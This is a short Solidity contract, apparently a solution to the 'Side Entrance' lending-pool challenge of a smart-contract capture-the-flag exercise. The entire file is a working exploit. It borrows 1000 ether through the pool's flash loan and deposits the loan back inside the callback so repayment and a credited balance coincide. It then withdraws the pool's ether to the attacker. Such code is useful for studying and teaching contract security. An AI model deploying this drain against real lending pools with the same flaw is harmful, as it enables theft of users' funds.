pragma solidity ^0.6.0;

import "./../side-entrance/SideEntranceLenderPool.sol";


contract IFlashLoanEtherReceiverAttack {

    address payable owner;
    SideEntranceLenderPool s;

    constructor(address _s) public {
        owner = msg.sender;
        s = SideEntranceLenderPool(_s);
    }

    function attack() public {
        s.flashLoan(1000 ether);
    }
    
    function execute() public payable{
        s.deposit{value: msg.value}();
    }


    function withdraw() public {
        s.withdraw();
        owner.transfer(address(this).balance);
    }

    receive() external payable { }

}